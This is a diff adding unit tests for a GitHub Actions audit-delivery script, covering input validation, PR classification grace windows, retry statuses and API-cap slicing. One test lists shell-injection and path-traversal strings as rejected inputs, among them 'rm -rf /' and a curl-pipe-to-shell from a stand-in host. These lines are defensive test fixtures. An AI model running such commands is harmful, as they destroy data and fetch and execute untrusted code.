@@ -34,6 +34,10 @@ import {
   chunk,
   REPLAY_BATCH,
   FAILED,
+  GRACE_MS,
+  RETRY_STATUS,
+  API_CAP,
+  SLICE_MAX,
 } from './audit-delivery.mjs';
 
 // ── helpers ──────────────────────────────────────────────────────────────────
@@ -189,6 +193,64 @@ test('parseArgs: callerFile tracks the basename of callerPath', () => {
   );
   // A bare filename with no directory component is its own basename.
   assert.equal(parseArgs(['--caller-path=bare.yml'], NOW).callerFile, 'bare.yml');
+});
+
+test('parseArgs: a callerPath basename that would re-target the API URL is rejected', () => {
+  // callerFile is interpolated into /actions/workflows/{file}/runs UNENCODED, so
+  // a basename carrying path syntax does not query a differently-named workflow
+  // — it queries a different ENDPOINT, and whatever that returns is then treated
+  // as this caller's run history. Each case below is chosen because it survives
+  // `.split('/').pop()` and still changes the request:
+  for (const bad of [
+    '..',                       // walks up out of /workflows
+    '..%2fruns',                // encoded traversal the server decodes
+    'x.yml?per_page=1',         // smuggles a query parameter
+    'x.yml#frag',               // truncates the path at the fragment
+    'x.yml/../../secrets',      // rejoins a different resource
+    'not-a-workflow',           // no yaml suffix: not a workflow file at all
+    '',                         // a trailing slash yields an empty basename
+    'sp ace.yml',               // an unencoded space is not a legal URL path
+  ]) {
+    assert.throws(
+      () => parseArgs([`--caller-path=.github/workflows/${bad}`], NOW),
+      /--caller-path/,
+      `--caller-path=${JSON.stringify(bad)} must be rejected`,
+    );
+  }
+
+  // And the legitimate shapes still pass, so the guard is not just "throws".
+  // (An uppercase `.YML` is deliberately NOT in this list: Actions only
+  // recognizes lowercase .yml/.yaml, so such a file is not a workflow.)
+  for (const ok of ['leaderboard-metrics.yml', 'a_b.c-d.yaml', 'Mixed-Case.yml']) {
+    assert.equal(parseArgs([`--caller-path=.github/workflows/${ok}`], NOW).callerFile, ok);
+  }
+});
+
+test('parseArgs: a backfillCaller carrying shell metacharacters is rejected', () => {
+  // backfillCaller is interpolated into the `gh workflow run` line the report
+  // tells a HUMAN to paste into a shell. The report is read by someone
+  // responding to a delivery alert, which is the worst possible moment to be
+  // handed a command that does something other than what it appears to.
+  for (const bad of [
+    'x.yml; rm -rf /',
+    'x.yml && curl evil.sh | sh',
+    'x.yml`id`',
+    'x.yml$(id)',
+    "x.yml' --repo other/repo '",
+    '$IFS.yml',
+    'no-suffix',
+  ]) {
+    assert.throws(
+      () => parseArgs([`--backfill-caller=${bad}`], NOW),
+      /--backfill-caller/,
+      `--backfill-caller=${JSON.stringify(bad)} must be rejected`,
+    );
+  }
+
+  assert.equal(
+    parseArgs(['--backfill-caller=leaderboard-backfill.yaml'], NOW).backfillCaller,
+    'leaderboard-backfill.yaml',
+  );
 });
 
 test('parseArgs: --repo turns on self-audit and splits owner/name', () => {
@@ -362,6 +424,77 @@ test('classify: a merged pr with no run and no onboarding timestamp is never_fir
   // No run means no run identity on the record.
   assert.equal('run_id' in c.never_fired[0], false);
   assert.equal('conclusion' in c.never_fired[0], false);
+});
+
+test('classify: a JUST-merged pr with no run yet is in_flight, not never_fired', () => {
+  // The second half of "the verdict is not knowable yet". GitHub indexes a
+  // workflow run a moment AFTER the merge, so a PR merged seconds ago has no run
+  // row — symptom-identical to never_fired, opposite meaning. Calling it
+  // never_fired puts a delivery that is about to happen on the replay list, and
+  // replaying re-writes to the prod metrics queue.
+  const merged = '2026-07-20T12:00:00Z';
+  const prs = [pr(9, merged, 'freshsha')];
+  const mergedTs = Date.parse(merged);
+
+  // One minute after the merge: inside the window.
+  const fresh = classify(prs, new Map(), null, mergedTs + 60_000);
+  assert.deepEqual(fresh.in_flight.map((r) => r.number), [9]);
+  assert.deepEqual(fresh.never_fired, []);
+
+  // A day later: the run was never going to appear.
+  const stale = classify(prs, new Map(), null, mergedTs + 24 * 60 * 60 * 1000);
+  assert.deepEqual(stale.never_fired.map((r) => r.number), [9]);
+  assert.deepEqual(stale.in_flight, []);
+});
+
+test('classify: the grace window is half-open at exactly GRACE_MS', () => {
+  // `now - merged < GRACE_MS` is strict, so the boundary instant is OUTSIDE the
+  // window. Asserted against GRACE_MS rather than a restated 900000 so that
+  // retuning the constant cannot silently invalidate the boundary it describes.
+  const merged = '2026-07-20T12:00:00Z';
+  const prs = [pr(9, merged, 'freshsha')];
+  const mergedTs = Date.parse(merged);
+
+  const inside = classify(prs, new Map(), null, mergedTs + GRACE_MS - 1);
+  assert.deepEqual(inside.in_flight.map((r) => r.number), [9]);
+
+  const atBoundary = classify(prs, new Map(), null, mergedTs + GRACE_MS);
+  assert.deepEqual(atBoundary.never_fired.map((r) => r.number), [9]);
+  assert.deepEqual(atBoundary.in_flight, []);
+
+  // And the window is generous enough to cover real run-indexing latency, which
+  // is seconds. A window of a few seconds would defeat the purpose.
+  assert.ok(GRACE_MS >= 60_000, 'a grace window under a minute cannot absorb indexing latency');
+});
+
+test('classify: pre_onboarding OUTRANKS the grace window', () => {
+  // A PR merged before the repo had a caller is a policy question forever, and
+  // recency does not change that. Order matters: if the grace check ran first, a
+  // just-merged PR in a repo onboarded later would be reported as "not yet
+  // decided" and then flip to pre_onboarding on the next cycle.
+  const merged = '2026-07-20T12:00:00Z';
+  const prs = [pr(9, merged, 'freshsha')];
+  const mergedTs = Date.parse(merged);
+
+  const c = classify(prs, new Map(), mergedTs + 1000, mergedTs + 60_000);
+
+  assert.deepEqual(c.pre_onboarding.map((r) => r.number), [9]);
+  assert.deepEqual(c.in_flight, []);
+  assert.deepEqual(c.never_fired, []);
+});
+
+test('classify: the grace window does NOT rescue a pr whose run already CONCLUDED', () => {
+  // A concluded failure is knowable now, however recent it is. Letting recency
+  // suppress it would hide the freshest breakage — exactly the alert with the
+  // most value.
+  const merged = '2026-07-20T12:00:00Z';
+  const prs = [pr(9, merged, 'hasrun')];
+  const byHead = new Map([['hasrun', run(1, 'hasrun', 'failure', merged)]]);
+
+  const c = classify(prs, byHead, null, Date.parse(merged) + 60_000);
+
+  assert.deepEqual(c.failed.map((r) => r.number), [9]);
+  assert.deepEqual(c.in_flight, []);
 });
 
 test('classify: the onboarding boundary splits pre_onboarding from never_fired', () => {
@@ -548,6 +681,22 @@ test('retryDelayMs: a missing or PAST reset falls back to the floor, not a negat
   assert.equal(retryDelayMs(hdrs({ 'retry-after': 'not-a-date' }), T0), 1000);
 });
 
+test('RETRY_STATUS covers the transient failures and NOT the deterministic ones', () => {
+  // Which statuses are retried decides whether one bad gateway on page 30 of 40
+  // discards the other 39 pages of work: an aborted audit is an exit-2 UNKNOWN
+  // over the entire repo, not a partial result.
+  for (const transient of [403, 429, 500, 502, 503, 504]) {
+    assert.ok(RETRY_STATUS.has(transient), `${transient} must be retried`);
+  }
+
+  // Retrying these wastes the attempt budget on an answer that will not change,
+  // and a 404 in particular is how a mistyped caller filename presents — four
+  // attempts make that failure slower to surface, not likelier to succeed.
+  for (const deterministic of [400, 401, 404, 409, 422, 501]) {
+    assert.equal(RETRY_STATUS.has(deterministic), false, `${deterministic} must NOT be retried`);
+  }
+});
+
 test('retryDelayMs: the wait is clamped to [1s, 60s]', () => {
   // Unbounded, a reset an hour out would hang the job until its timeout.
   assert.equal(retryDelayMs(hdrs({ 'retry-after': '3600' }), T0), 60000);
@@ -647,6 +796,73 @@ test('runsInRange: a slice over the 1000 cap SUBDIVIDES instead of silently trun
   });
 });
 
+test('SLICE_MAX leaves a margin below API_CAP, or the shortfall check is blind', () => {
+  // The shortfall check is `got.length < total`, and `got.length` is itself
+  // CLAMPED to API_CAP — so it can never exceed it. If a slice were allowed to
+  // probe AT the cap, one run arriving before the fetch would return a clamped
+  // 1000 and `1000 < 1000` is false: silently dropped, which is the exact failure
+  // class this whole mechanism exists to prevent. The margin is what makes
+  // between-probe-and-fetch growth observable instead of clamped away.
+  assert.ok(SLICE_MAX < API_CAP, 'a slice threshold at the cap cannot detect truncation');
+
+  // And the margin has to exceed a plausible amount of churn during one audit,
+  // not merely be nonzero — guard merges on the order of 30 runs/day.
+  assert.ok(API_CAP - SLICE_MAX >= 100, 'the margin must absorb real between-probe churn');
+});
+
+test('runsInRange: a slice OVER SLICE_MAX but under the hard cap still subdivides', () => {
+  // The regression test for the boundary itself. A total of 950 is under the
+  // API's 1000 cap, so the pre-fix code fetched it in one go and could not tell a
+  // clamped result from a complete one. It must subdivide instead.
+  // 950, expressed against API_CAP and NOT against SLICE_MAX: deriving it from
+  // the threshold under test would make the fixture move with the bug, so
+  // lowering SLICE_MAX back to the cap would keep this test green. Tying it to
+  // the API's hard cap — a fact about GitHub, not a tunable — keeps it honest.
+  const OVER = API_CAP - 50;
+  assert.ok(OVER > SLICE_MAX && OVER < API_CAP, 'fixture must sit between the threshold and the cap');
+
+  let sawWideProbe = false;
+  const client = stubClient({
+    total: (range) => {
+      const [a, b] = range.split('..');
+      if (a === b) return 2;
+      sawWideProbe = true;
+      return OVER;
+    },
+    runs: () => [{ id: 1, head_sha: 'a' }, { id: 2, head_sha: 'b' }],
+  });
+
+  return runsInRange(client, { ...RCFG, since: '2026-07-28' }, 'guard').then((got) => {
+    assert.ok(sawWideProbe, 'the multi-day range must have been probed');
+    assert.ok(client.seen.pages.length > 1, 'a 950-run range must be split, not fetched whole');
+    // Every fetched slice was a single day, i.e. it recursed all the way down
+    // rather than fetching the 950 as one page set.
+    for (const range of client.seen.pages) {
+      const [a, b] = range.split('..');
+      assert.equal(a, b, `slice ${range} should have been subdivided further`);
+    }
+    assert.equal(got.length, client.seen.pages.length * 2);
+  });
+});
+
+test('runsInRange: a fetch that REACHES the hard cap is rejected as untrustworthy', () => {
+  // The other end of the same property. A slice is only fetched after probing at
+  // or below SLICE_MAX, so coming back with API_CAP results means it grew by at
+  // least the whole margin since the probe — and a result set sitting exactly on
+  // the cap is indistinguishable from one clamped BY the cap. Tolerating growth
+  // (which the shortfall test deliberately does) must not extend to tolerating a
+  // result that may be truncated.
+  const client = stubClient({
+    total: () => SLICE_MAX,
+    runs: () => Array.from({ length: API_CAP }, (_, i) => ({ id: i, head_sha: `s${i}` })),
+  });
+
+  return assert.rejects(
+    () => runsInRange(client, RCFG, 'guard'),
+    /reaching the API's 1000-result cap — the result set may be clamped/,
+  );
+});
+
 test('runsInRange: a SINGLE DAY over the cap throws rather than reporting what it can see', () => {
   // Day is the floor the `created` filter supports, so this is unrepresentable.
   // Reporting the visible subset would invent gaps for the rest.
@@ -654,7 +870,7 @@ test('runsInRange: a SINGLE DAY over the cap throws rather than reporting what i
 
   return assert.rejects(
     () => runsInRange(client, { ...RCFG, since: ymdToday() }, 'guard'),
-    /exceeds the API's 1000-result cap and cannot be subdivided further/,
+    /exceeds the safe slice size of 900 .*and cannot be subdivided further/,
   );
 });
 
@@ -851,15 +1067,15 @@ test('renderMarkdown: a replay list under the cap stays ONE command with no batc
   assert.doesNotMatch(md, /batches/);
 });
 
-test('renderMarkdown: a still-running count is tabulated as NOT a gap, and only when nonzero', () => {
+test('renderMarkdown: an undecided count is tabulated as NOT a gap, and only when nonzero', () => {
   const running = renderMarkdown(gapReport({ inFlight: 2 }), CFG);
-  assert.match(running, /\| still running \(not a gap, not replayed\) \| 2 \|/);
+  assert.match(running, /\| not yet decided \(not a gap, not replayed\) \| 2 \|/);
   // It is reported alongside the gaps but excluded from the replay command, so
   // the row must not change what gets replayed.
   assert.match(running, /-f pr_numbers='9,10,100'/);
 
   const none = renderMarkdown(gapReport({ inFlight: 0 }), CFG);
-  assert.doesNotMatch(none, /still running/);
+  assert.doesNotMatch(none, /not yet decided/);
 });
 
 test('renderMarkdown: a clean report says No gaps and offers no replay command', () => {
@@ -897,8 +1113,13 @@ test('renderMarkdown: a clean report with a run still in flight does NOT claim e
   const md = renderMarkdown(cleanButRunning, CFG);
 
   assert.match(md, /No gaps\./);
-  assert.match(md, /\*\*2\*\* merged PR\(s\) have a delivery still\s+running/);
-  assert.match(md, /re-run the audit once they/);
+  assert.match(md, /\*\*2\*\* merged PR\(s\) are not yet decided/);
+  assert.match(md, /Re-run the audit once they settle/);
+  // in_flight has TWO causes and the prose must name both, or a reader takes
+  // "still running" literally and treats a just-merged PR with no run row as
+  // something other than the undecided case it is.
+  assert.match(md, /still running/);
+  assert.match(md, /merged too recently for\s+its run to exist yet/);
   // The unqualified claim must be absent — this is the assertion the bug fails.
   assert.doesNotMatch(md, /No gaps\. Every merged PR in the window has a successful metrics delivery\./);
   // Still no replay is offered: an in-flight delivery is not replayable.
